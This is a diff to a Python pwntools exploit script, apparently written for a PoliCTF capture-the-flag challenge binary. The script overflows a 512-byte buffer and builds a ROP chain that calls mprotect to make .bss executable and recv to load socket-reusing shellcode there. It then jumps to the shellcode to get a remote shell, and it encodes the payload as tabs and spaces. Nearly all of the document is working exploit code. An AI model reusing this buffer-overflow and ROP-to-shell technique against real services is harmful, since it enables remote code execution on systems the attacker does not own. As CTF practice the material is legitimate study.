@@ -1,24 +1,25 @@
 #!/usr/bin/env python
 from pwn import *
 context('i386', 'linux', 'ipv4')
-# from pwn.aeROPics import aeROPics, ropcall
 
 sock = remote('localhost', 32000, timeout = None)
 # sock = remote('pwn.challenges.polictf.it', 32000)
 
-codeaddr = 0x0804b090
-
 shellcode = asm(dupsh(0))
 
-a = rop.load('./chal')
-rop.call('mprotect', ('_got_plt', len(shellcode), 7))
-rop.call('recv', (0, codeaddr, len(shellcode), 0))
-rop.call(codeaddr)
-sock.send('black'.ljust(16, '\n'))
+rop = ROP('./chal')
 
-data = 'A' * 512 + p32(32)*4 + rop.payload()
+code = rop['.bss'] + 0x10
+
+rop.call('mprotect', (code, len(shellcode), 7))
+rop.call('recv', (0, code, len(shellcode), 0))
+rop.call(code)
+
+sock.send('black'.ljust(16, '\n'))
+data = 'A' * 512 + p32(32)*4 + rop
 data = bits_str(data, endian = 'big', one='\t', zero=' ')
 data = data.ljust(512 * 10, ' ')
+pause()
 sock.send(data)
 
 sock.send(shellcode)
